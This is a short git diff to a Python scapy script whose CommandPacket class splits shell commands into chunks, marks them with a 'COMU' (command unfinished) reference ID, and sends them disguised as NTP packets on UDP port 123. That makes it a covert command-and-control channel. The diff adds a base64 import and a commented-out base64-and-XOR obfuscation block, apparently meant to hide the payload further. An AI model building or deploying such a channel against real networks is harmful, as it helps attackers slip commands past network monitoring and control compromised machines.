@@ -1,4 +1,5 @@
 import datetime
+import base64
 
 from scapy.all import IP, UDP, NTP, send
 
@@ -33,7 +34,7 @@ class CommandPacket(Packet):
         else:
             cmdArr = [self.command]
 
-        print(cmdArr)
+        #print(cmdArr)
         for ctr in range(0, len(cmdArr)):
             if ctr < len(cmdArr)-1:
                 refId = str("COMU".encode('utf-8')).strip('b\'') #Command Unfinished
@@ -43,7 +44,18 @@ class CommandPacket(Packet):
             ucode = str(cmdArr[ctr].encode("utf-8")).strip('b\'')#.strip("\"") #Encoded command
 
             ntpPayload = self.baseline + refId + ucode +"\x00"*(32-len(cmdArr[ctr]))
-            ntpPayload = ntpPayload.replace("\\", "")
+            ntpPayload = ntpPayload.replace("\\", "").strip("b\'")
+            """
+            base64_bytes = base64.b64encode(ntpPayload.encode('utf-8'))
+
+            #outbytes = b''
+            #for bt in base64_bytes:
+                #outbytes += bytes([bt ^ ord(chr(46))])
+
+            ntpPayload = str(base64_bytes)
+            print(len(ntpPayload))
+            """
+            #ntpPayload = ntpPayload.replace("\\\\", "\\")
 
             packet = IP(dst=self.destination)/UDP(dport=123,sport=50000)/(ntpPayload)
             
